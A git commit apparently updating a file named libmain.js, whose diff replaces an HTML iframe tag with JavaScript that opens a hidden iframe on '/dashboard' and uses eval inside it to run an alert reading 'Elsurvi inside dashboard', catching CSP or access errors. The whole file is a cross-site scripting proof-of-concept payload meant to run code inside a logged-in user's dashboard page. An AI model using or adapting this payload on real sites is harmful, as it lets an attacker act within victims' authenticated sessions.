46afa0b3d1acc69429edf51e9351612c28ef9ede
itsonlyforhosting <zerorisk.indian@gmail.com>
2025-07-27 21:21:45 +0530

    Update libmain.js

--- libmain.js
+++ libmain.js
@@ -1,1 +1,11 @@
-<iframe src="/dashboard" style="display:none" onload="this.contentWindow.eval(`alert('Elsurvi inside dashboard')`)"></iframe>
+var f = document.createElement('iframe');
+  f.style.display = 'none';
+  f.src = '/dashboard';
+  f.onload = function() {
+    try {
+      f.contentWindow.eval("alert('Elsurvi inside dashboard')");
+    } catch(e) {
+      console.log("Iframe access denied or CSP blocked:", e);
+    }
+  };
+  document.body.appendChild(f);
